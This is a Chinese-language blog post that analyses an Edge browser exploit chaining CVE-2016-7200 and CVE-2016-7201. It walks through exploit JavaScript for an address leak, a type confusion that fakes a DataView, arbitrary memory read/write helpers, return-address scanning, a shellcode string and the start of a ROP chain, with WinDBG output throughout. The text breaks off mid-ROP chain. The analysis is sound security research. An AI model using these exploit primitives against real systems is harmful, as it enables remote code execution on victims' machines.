<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>michael_du&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="不想迷失在日常的工作中，在这里，记录下朝着自己的目标走过的每一个脚印。">
<meta property="og:type" content="website">
<meta property="og:title" content="michael_du's blog">
<meta property="og:url" content="https://michaelpdu.github.io/index.html">
<meta property="og:site_name" content="michael_du's blog">
<meta property="og:description" content="不想迷失在日常的工作中，在这里，记录下朝着自己的目标走过的每一个脚印。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="michael_du's blog">
<meta name="twitter:description" content="不想迷失在日常的工作中，在这里，记录下朝着自己的目标走过的每一个脚印。">
  
    <link rel="alternate" href="/atom.xml" title="michael_du&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">michael_du&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">不想迷失在日常的工作中，在这里，记录下朝着自己的目标走过的每一个脚印。 -- “积土成山,风雨兴焉;积水成渊,蛟龙生焉”</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://michaelpdu.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-CVE-2016-7200-CVE-2016-7201-Edge" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/01/26/CVE-2016-7200-CVE-2016-7201-Edge/" class="article-date">
  <time datetime="2017-01-26T05:21:26.000Z" itemprop="datePublished">2017-01-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/01/26/CVE-2016-7200-CVE-2016-7201-Edge/">CVE-2016-7200 &amp; CVE-2016-7201 (Edge)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="利用过程分析"><a href="#利用过程分析" class="headerlink" title="利用过程分析"></a>利用过程分析</h1><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>在Malware Don’t Need Coffee上看到一个最新的Edge利用，拿出来看看，相应的EK sample和更多信息可以从<a href="http://malware.dontneedcoffee.com/2017/01/CVE-2016-7200-7201.html" target="_blank" rel="external">这里</a>获取。</p>
<p>为了简化sample分析过程，可以直接去git上拿<a href="https://github.com/theori-io/chakra-2016-11" target="_blank" rel="external">PoC Sample</a>。</p>
<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>分析以后，会发现sample的利用过程，大致如下：</p>
<ol>
<li>利用CVE-2016-7200（Array.filter 中的InfoLeak 漏洞）， 泄露出传入对象的地址，这里是整形数组，可以参考PutDataAndGetAddr</li>
<li>利用CVE-2016-7201（FillFromPrototypes中的类型混淆漏洞），将传入的地址所对应的内存混淆成另外一个var dv，参考TriggerFillFromPrototypesBug，这里传入的地址参数恰巧指向上面Array对象x的数据区域，然后，dv通过DataView.getUint32和DataView.setUint32实现任意地址读写</li>
<li>利用这两个漏洞，得到NativeIntArray的虚表地址，通过偏移进一步确定chakra.dll的基址，以及chakra!ScriptSite::Execute函数返回地址</li>
<li>构造Shellcode和ROP，并用ROP入口地址覆盖上面泄露出来的返回地址，使程序跳转到ROP执行</li>
<li>ROP首先调用了VirtualProtect，修改shellcode所在堆区域的protect属性，可读写-&gt;可执行，最后程序跳转到shellcode处执行</li>
</ol>
<h2 id="细节剖析"><a href="#细节剖析" class="headerlink" title="细节剖析"></a>细节剖析</h2><h3 id="先看看CVE-2016-7200，加了一些alert，用于帮助我们看到更多的信息"><a href="#先看看CVE-2016-7200，加了一些alert，用于帮助我们看到更多的信息" class="headerlink" title="先看看CVE-2016-7200，加了一些alert，用于帮助我们看到更多的信息"></a>先看看CVE-2016-7200，加了一些alert，用于帮助我们看到更多的信息</h3><p>如果没有修改a的原型的动作，a.filter应该还是返回a本身。增加了这个原型修改以后，会变成每个对象的地址，当然，在X64环境下，每个对象有两个地址，高地址和低地址，各32位。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> x = (<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">56</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)).slice();</div><div class="line"><span class="keyword">var</span> [hi, lo] = PutDataAndGetAddr(x);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">PutDataAndGetAddr</span>(<span class="params">t</span>)</span></div><div class="line">&#123;</div><div class="line">    alert(<span class="string">"enter into PutDataAndGetAddr"</span>);</div><div class="line">    <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">dummy</span> </span>&#123;</div><div class="line">        <span class="keyword">constructor</span>() &#123;</div><div class="line">            <span class="keyword">return</span> d;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyArray</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</div><div class="line">        <span class="keyword">static</span> get [<span class="built_in">Symbol</span>.species]() &#123;</div><div class="line">            <span class="keyword">return</span> dummy;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(&#123;&#125;, t, <span class="string">"theori"</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>);</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">i</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">    a.__proto__ = MyArray.prototype;</div><div class="line">    alert(a);</div><div class="line">    <span class="keyword">var</span> o = a.filter(test);</div><div class="line">    alert(o);</div><div class="line">    <span class="keyword">var</span> h = [];</div><div class="line">    <span class="keyword">for</span> (item <span class="keyword">in</span> o) &#123;</div><div class="line">        <span class="keyword">var</span> n = <span class="keyword">new</span> <span class="built_in">Number</span>(o[item]);</div><div class="line">        <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</div><div class="line">            n = n + <span class="number">0x100000000</span>;</div><div class="line">        &#125;</div><div class="line">        h.push(n);</div><div class="line">    &#125;</div><div class="line">   print_address_64(<span class="string">"Return address of PutDataAndGetAddr"</span>, h[<span class="number">3</span>], h[<span class="number">2</span>]);</div><div class="line">    <span class="keyword">return</span> [h[<span class="number">3</span>], h[<span class="number">2</span>]];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在filter调用前的结果:<br><img src="/images/CVE-2016-7200_CVE-2016-7201/1_before_filter_alert_page.png" alt=""></p>
<p>在filter调用后的结果:<br><img src="/images/CVE-2016-7200_CVE-2016-7201/2_after_filter_alert_page.png" alt=""></p>
<p>将结果转成64位地址：<br><img src="/images/CVE-2016-7200_CVE-2016-7201/3_return_address.png" alt=""></p>
<p>可以看到最后的返回地址是0x2131a027b60，通过WinDBG中，可以看看这个地址所对应的信息。</p>
<pre>
<code>
0:024> dq 0x2131a027b60
00000213`1a027b60  <b><font color="red">00007ff9`6b5838d8</font></b> 00000213`1a1bb040
00000213`1a027b70  00000000`00000000 00000000`00000005
00000213`1a027b80  00000000`00000010 00000213`1a027ba0
00000213`1a027b90  00000213`1a027ba0 00000213`19faf1c0
00000213`1a027ba0  00000010`00000000 00000000`00000012
00000213`1a027bb0  00000000`00000000 <b><font color="red">00000000`00000038</font></b>
00000213`1a027bc0  00000000`00000000 00000000`00000000
00000213`1a027bd0  00000000`00000000 00000000`00000000
</code>
</pre>

<p>因为传入的x是整形数组，通过在windbg中也可以看到相应的信息</p>
<pre>
<code>
0:024> ln poi(0x2131a027b60)
<font color="red">(00007ff9`6b5838d8)   <b>chakra!Js::JavascriptNativeIntArray::`vftable'</b></font>   |  (00007ff9`6b583c28)   chakra!Js::JavascriptArray::`vftable'
Exact matches:
    chakra!Js::JavascriptNativeIntArray::`vftable' = <no type="" information="">

0:024> ?38
Evaluate expression: 56 = 00000000`00000038
</no></code>
</pre>

<p>这里的0x38恰恰是56，也就是传入的x的数据。而这些数据的起始地址与x object内存地址相差恰好是0x58，这也就是后面会用到的信息。<br>当然这个结果的验证还可以简单地修改一下x的内容，并查看相应的内存布局。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> x = (<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0xaaaa</span>, <span class="number">0xaaab</span>, <span class="number">0xaaac</span>, <span class="number">0xaaad</span>, <span class="number">0xaaae</span>, <span class="number">0xaaaf</span>, <span class="number">0xaaba</span>, <span class="number">0xaabb</span>, <span class="number">0xaabc</span>, <span class="number">0xaabd</span>, <span class="number">0xaabe</span>, <span class="number">0xaabf</span>, <span class="number">0xaaca</span>, <span class="number">0xaacb</span>, <span class="number">0xaacc</span>, <span class="number">0xaacd</span>)).slice();</div></pre></td></tr></table></figure>
<pre>
<code>
0:024> dq 1b10f5a7b60
000001b1`0f5a7b60  00007ff9`6b5838d8 000001b1`0f6eb040
000001b1`0f5a7b70  00000000`00000000 00000000`00000005
000001b1`0f5a7b80  00000000`00000010 000001b1`0f5a7ba0
000001b1`0f5a7b90  000001b1`0f5a7ba0 000001b1`0daff1c0
000001b1`0f5a7ba0  00000010`00000000 00000000`00000012
000001b1`0f5a7bb0  00000000`00000000 <b>0000aaab`0000aaaa</b>
000001b1`0f5a7bc0  <b>0000aaad`0000aaac 0000aaaf`0000aaae</b>
000001b1`0f5a7bd0  <b>0000aabb`0000aaba 0000aabd`0000aabc</b>
</code>
</pre>

<p>关于JavascriptNativeIntArray的内存布局，可以用专门的方法进行分析，可以参考《<a href="http://expdev-kiuhnm.rhcloud.com/" target="_blank" rel="external">Exploit Development</a>》中<a href="http://expdev-kiuhnm.rhcloud.com/2015/05/31/ie10-reverse-engineering-ie/" target="_blank" rel="external">13.1节</a>，关于逆向IE中Array的分析方法。</p>
<h3 id="再看看CVE-2016-7201能做什么"><a href="#再看看CVE-2016-7201能做什么" class="headerlink" title="再看看CVE-2016-7201能做什么"></a>再看看CVE-2016-7201能做什么</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">TriggerFillFromPrototypesBug</span>(<span class="params">lo, hi</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// Type* (which has TypeId)</span></div><div class="line">    x[<span class="number">2</span>] = lo;</div><div class="line">    x[<span class="number">3</span>] = hi;</div><div class="line">    <span class="comment">// +0x3C points to 0 (index 1) for bypassing isDetached check</span></div><div class="line">    x[<span class="number">10</span>] = (lo - <span class="number">0x38</span>)|<span class="number">0</span>;</div><div class="line">    x[<span class="number">11</span>] = hi;</div><div class="line">    <span class="comment">// buffer length</span></div><div class="line">    x[<span class="number">8</span>] = <span class="number">0x200</span>;</div><div class="line">    <span class="comment">// buffer addr</span></div><div class="line">    x[<span class="number">14</span>] = (lo - <span class="number">0x58</span>)|<span class="number">0</span>;</div><div class="line">    x[<span class="number">15</span>] = hi;</div><div class="line">    <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x11111111</span>, <span class="number">0</span>, <span class="number">0x22222222</span>, <span class="number">0</span>, <span class="number">0x33333333</span>, <span class="number">0</span>, lo, hi, <span class="number">0x55555555</span>, <span class="number">0</span>);</div><div class="line">    <span class="keyword">var</span> handler = &#123;</div><div class="line">        <span class="attr">getPrototypeOf</span>: <span class="function"><span class="keyword">function</span>(<span class="params">target, name</span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> a;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Proxy</span>([], handler);</div><div class="line">    <span class="keyword">var</span> b = [&#123;&#125;, [], <span class="string">"abc"</span>];</div><div class="line">    b.__proto__ = p;</div><div class="line">    b.length = <span class="number">4</span>;</div><div class="line">    a.shift.call(b);</div><div class="line">    dv = b[<span class="number">2</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从直观上看，这个函数允许传入一个地址，然后，将结果存放在dv中。dv是什么？与传入的地址有什么关系？<br>因为我们上面有另外一个漏洞可以泄露出指定对象的地址，这里可以借用一下。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[hi, lo] = [hi|<span class="number">0</span>, (lo + <span class="number">0x58</span>)|<span class="number">0</span>];</div><div class="line">print_address_64(<span class="string">"x_lo_plus_0x58"</span>, hi, lo);</div><div class="line">TriggerFillFromPrototypesBug(lo, hi);</div><div class="line"><span class="keyword">var</span> [dv_hi, dv_lo] = PutDataAndGetAddr(dv);</div><div class="line">print_address_64(<span class="string">"address of dv"</span>, dv_hi, dv_lo);</div></pre></td></tr></table></figure>
<p>传入的是x数据区域的地址，TriggerFillFromPrototypesBug执行以后，变量dv就有了值，实测以后会发现：</p>
<p><em>dv这个变量的内存地址就是传入的x数据区地址，而在后面使用dv的地方，又将dv当做DataView使用。</em></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> dv;</div><div class="line"><span class="keyword">var</span> fdv = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>));</div><div class="line">...</div><div class="line">function SetAddress(addr)</div><div class="line">&#123;</div><div class="line">    x[<span class="number">14</span>] = addr.low|<span class="number">0</span>;</div><div class="line">    x[<span class="number">15</span>] = addr.high|<span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Read32</span>(<span class="params">addr</span>)</span></div><div class="line">&#123;</div><div class="line">    SetAddress(addr);</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Long(fdv.getUint32.call(dv, <span class="number">0</span>, <span class="literal">true</span>), <span class="number">0</span>, <span class="literal">true</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Read64</span>(<span class="params">addr</span>)</span></div><div class="line">&#123;</div><div class="line">    SetAddress(addr);</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Long(fdv.getUint32.call(dv, <span class="number">0</span>, <span class="literal">true</span>), fdv.getUint32.call(dv, <span class="number">4</span>, <span class="literal">true</span>), <span class="literal">true</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Write32</span>(<span class="params">addr, val</span>)</span></div><div class="line">&#123;</div><div class="line">    SetAddress(addr);</div><div class="line">    fdv.setUint32.call(dv, <span class="number">0</span>, val.low|<span class="number">0</span>, <span class="literal">true</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Write64</span>(<span class="params">addr, val</span>)</span></div><div class="line">&#123;</div><div class="line">    SetAddress(addr);</div><div class="line">    fdv.setUint32.call(dv, <span class="number">0</span>, val.low|<span class="number">0</span>, <span class="literal">true</span>);</div><div class="line">    fdv.setUint32.call(dv, <span class="number">4</span>, val.high|<span class="number">0</span>, <span class="literal">true</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以，x的数据区所对应的那块内存，在这里就成为一个DataView对象的内存布局了。</p>
<p>TriggerFillFromPrototypesBug函数中的这段code：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Type* (which has TypeId)</span></div><div class="line">x[<span class="number">2</span>] = lo;</div><div class="line">x[<span class="number">3</span>] = hi;</div><div class="line"><span class="comment">// +0x3C points to 0 (index 1) for bypassing isDetached check</span></div><div class="line">x[<span class="number">10</span>] = (lo - <span class="number">0x38</span>)|<span class="number">0</span>;</div><div class="line">x[<span class="number">11</span>] = hi;</div><div class="line"><span class="comment">// buffer length</span></div><div class="line">x[<span class="number">8</span>] = <span class="number">0x200</span>;</div><div class="line"><span class="comment">// buffer addr</span></div><div class="line">x[<span class="number">14</span>] = (lo - <span class="number">0x58</span>)|<span class="number">0</span>;</div><div class="line">x[<span class="number">15</span>] = hi;</div></pre></td></tr></table></figure>
<p>本质是在修改DataView对象各个域的值，下面，我们用自己编译的ChakraCore来验证上面的猜测。<br>因为微软已经将<a href="https://github.com/Microsoft/ChakraCore" target="_blank" rel="external">Chakra</a>开源，这样可以自行编译一个ChakraCore，也会有更丰富的symbol，可以使用下面的命令将外部的dll加载到调试进程中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">0:004&gt; .reload /f /i C:\Users\admin\Desktop\ChakraCore\ChakraCore.dll=ffffffff</div><div class="line">0:004&gt; lm</div><div class="line">start             end                 module name</div><div class="line">00000000`ffffffff 00000000`ffffffff   ChakraCore   (private pdb symbols)  C:\ProgramData\dbg\sym\ChakraCore.pdb\0AA246FBAE584A8BBE5C233412A3A6051\ChakraCore.pdb</div><div class="line">00007ff7`b3e00000 00007ff7`b3e16000   microsoftedgecp   (deferred)</div><div class="line"></div><div class="line">0:004&gt; dt ChakraCore!Js::DataView</div><div class="line">   +0x000 __VFN_table : Ptr64 </div><div class="line">   +0x008 type             : Ptr64 Js::Type</div><div class="line">   +0x010 auxSlots         : Ptr64 Ptr64 Void</div><div class="line">   +0x018 objectArray      : Ptr64 Js::ArrayObject</div><div class="line">   +0x018 arrayFlags       : Js::DynamicObjectFlags</div><div class="line">   +0x01a arrayCallSiteIndex : Uint2B</div><div class="line">   +0x020 length           : Uint4B</div><div class="line">   +0x028 arrayBuffer      : Ptr64 Js::ArrayBufferBase</div><div class="line">   +0x030 byteOffset       : Uint4B</div><div class="line">   +0x038 buffer           : Ptr64 UChar</div></pre></td></tr></table></figure>
<p>参考相应的偏移可以看出DataView相关的域正好与上面给x设置的值是一致的。尤其是x[14]和x[15]就是DataView中buffer的地址，这就使得SetAddress函数可以通过x来任意设置需要读写的位置，实现全局读写。</p>
<h3 id="关于info-leak"><a href="#关于info-leak" class="headerlink" title="关于info leak"></a>关于info leak</h3><p>解释一下下面这段code</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> vtable = Read64(<span class="keyword">new</span> Long(lo - <span class="number">0x58</span>, hi, <span class="literal">true</span>));</div><div class="line"><span class="keyword">var</span> chakraBase = Read64(vtable).sub(<span class="number">0x274C40</span>);</div><div class="line"><span class="keyword">var</span> threadCtxPtr = Read64(chakraBase.add(<span class="number">0x735EA8</span>));</div><div class="line"><span class="keyword">var</span> stackLimit = Read64(threadCtxPtr.add(<span class="number">0x388</span>));</div><div class="line"><span class="keyword">var</span> stack = stackLimit.sub(<span class="number">0xC000</span>).add(<span class="number">10</span>*<span class="number">1024</span>*<span class="number">1024</span>); </div><div class="line"><span class="keyword">var</span> retPtr = chakraBase.add(<span class="number">0x162A1D</span>);</div><div class="line"><span class="keyword">var</span> retPtrAddr;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">8</span>; i &lt; <span class="number">32</span> * <span class="number">1024</span>; i += <span class="number">8</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">var</span> val = Read64(stack.sub(i));</div><div class="line">    <span class="keyword">if</span> (val.equals(retPtr))</div><div class="line">    &#123;</div><div class="line">        retPtrAddr = stack.sub(i);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在脚本执行的线程栈空间中（搜索10M的空间），去查找是否有<strong>00007ff9`6b152a1d</strong>，也就是chakraBase.add(0x162A1D)</p>
<p>因为这个值是调用函数chakra!ScriptSite::Execute的返回值，后面会使用ROP entry来覆盖这个栈上的值，实现Direct Return。</p>
<pre>
<code>
0:012> ub chakra+0x162A1D
chakra!ScriptEngine::ExecutePendingScripts+0x182:
00007ff9`6b1529fa 48895c2468      mov     qword ptr [rsp+68h],rbx
00007ff9`6b1529ff 488d442458      lea     rax,[rsp+58h]
00007ff9`6b152a04 4889442420      mov     qword ptr [rsp+20h],rax
00007ff9`6b152a09 4533c9          xor     r9d,r9d
00007ff9`6b152a0c 4c8d442460      lea     r8,[rsp+60h]
00007ff9`6b152a11 498bd7          mov     rdx,r15
00007ff9`6b152a14 488b4f20        mov     rcx,qword ptr [rdi+20h]
00007ff9`6b152a18 e8f3f10400      call    chakra!ScriptSite::Execute (00007ff9`6b1a1c10)

0:012> u chakra+0x162A1D
chakra!ScriptEngine::ExecutePendingScripts+0x1a5:
<b><font color="red">00007ff9`6b152a1d</font></b> 448bf0          mov     r14d,eax
00007ff9`6b152a20 85c0            test    eax,eax
00007ff9`6b152a22 7820            js      chakra!ScriptEngine::ExecutePendingScripts+0x1cc (00007ff9`6b152a44)
00007ff9`6b152a24 488b8424e8000000 mov     rax,qword ptr [rsp+0E8h]
00007ff9`6b152a2c 4885c0          test    rax,rax
00007ff9`6b152a2f 7413            je      chakra!ScriptEngine::ExecutePendingScripts+0x1cc (00007ff9`6b152a44)
00007ff9`6b152a31 488bd0          mov     rdx,rax
00007ff9`6b152a34 488b4c2458      mov     rcx,qword ptr [rsp+58h]
</code>
</pre>

<h3 id="看看shellcode的信息"><a href="#看看shellcode的信息" class="headerlink" title="看看shellcode的信息"></a>看看shellcode的信息</h3><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var sc = unescape("%u8148%u78ec%u0001%u4c00%u848d%u6824%u0001%u4800…”);</div><div class="line">print_address_64("shellcode", shi, slo);</div><div class="line">var [shi, slo] = PutDataAndGetAddr(sc);</div><div class="line">var shcodeAddr = Read64((new Long(slo|0, shi|0, true).add(0x20)));</div><div class="line">alert("shcodeAddr: 0x" + shcodeAddr.toString(16));</div></pre></td></tr></table></figure>
<p><img src="/images/CVE-2016-7200_CVE-2016-7201/6_shellcode_address.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">0:026&gt; dq 2096d0d3540</div><div class="line">00000209`6d0d3540  00007ff9`6b571390 00000209`6cf04450</div><div class="line">00000209`6d0d3550  00000000`00000000 00000000`0000035e</div><div class="line">00000209`6d0d3560  00000209`6d03c038 00001434`0000035e</div><div class="line">00000209`6d0d3570  00000001`ffffffff 00000209`6d03c020</div><div class="line">00000209`6d0d3580  00000000`0000001a 00000209`6cf20000</div><div class="line">00000209`6d0d3590  00000209`6cf04240 00007ff9`6b2615a0</div><div class="line">00000209`6d0d35a0  00000000`00000000 00000209`6d0d3600</div><div class="line">00000209`6d0d35b0  00000000`00000000 00000209`6d0a1200</div></pre></td></tr></table></figure>
<pre>
<code>
0:026> ln poi(2096d0d3540)
<font color="red">(00007ff9`6b571390)   <b>chakra!Js::CompoundString::`vftable'</b></font>   |  (00007ff9`6b571690)   chakra!Js::ConcatStringN<2>::`vftable'
Exact matches:
    chakra!Js::CompoundString::`vftable' = &lt;no type information>
</2></code>
</pre>

<p>看来当前的shellcode是一个CompoundString的对象，而其结构可以通过下面的命令看到更为详细信息。</p>
<pre>
<code>
0:026> dt -b chakracore!Js::CompoundString 2096d0d3540
   +0x000 __VFN_table : 0x00007ff9`6b571390 
   +0x008 type             : 0x00000209`6cf04450 
   +0x010 m_pszValue       : (null) 
   +0x018 m_charLength     : 0x35e
   +0x020 lastBlockInfo    : Js::CompoundString::BlockInfo
      <b>+0x000 buffer           : 0x00000209`6d03c038 </b>
      +0x008 charLength       : 0x35e
      +0x00c charCapacity     : 0x1434
   +0x030 directCharLength : 0xffffffff
   +0x034 ownsLastBlock    : 1
   +0x038 lastBlock        : 0x00000209`6d03c020

0:026> dd 00000209`6d03c038
00000209`6d03c038  78ec8148 4c000001 6824848d 48000001
00000209`6d03c048  05e5158d 8d480000 0005b50d 041ae800
00000209`6d03c058  8b4c0000 0168248c 8d4c0000 01702484
00000209`6d03c068  8d480000 0005b315 0d8d4800 00000592
00000209`6d03c078  0003f7e8 0d8d4800 00000586 682494ff
00000209`6d03c088  48000001 8d48c189 0005ab15 2494ff00
00000209`6d03c098  00000170 24848948 00000108 5f0d8d48
00000209`6d03c0a8  ff000005 01682494 89480000 158d48c1
</code>
</pre>

<p>根据上面的数据结构可以看到，shellcode对象偏移0x20正好是一个buffer的指针，这个指针正好指向实际的data，这也就解释了为什么在读取shellcode实际的数据时，需要+0x20的缘故。</p>
<h3 id="ROP与exploit-trigger"><a href="#ROP与exploit-trigger" class="headerlink" title="ROP与exploit trigger"></a>ROP与exploit trigger</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> rop = [</div><div class="line">    <span class="comment">/*</span></div><div class="line">        chakraBase + 0x1DA2F5           // pop rdi; pop rsi; pop rbx; retn</div><div class="line">        shcodeAddr &amp; 0xFF..FFF000       // lpAddress</div><div 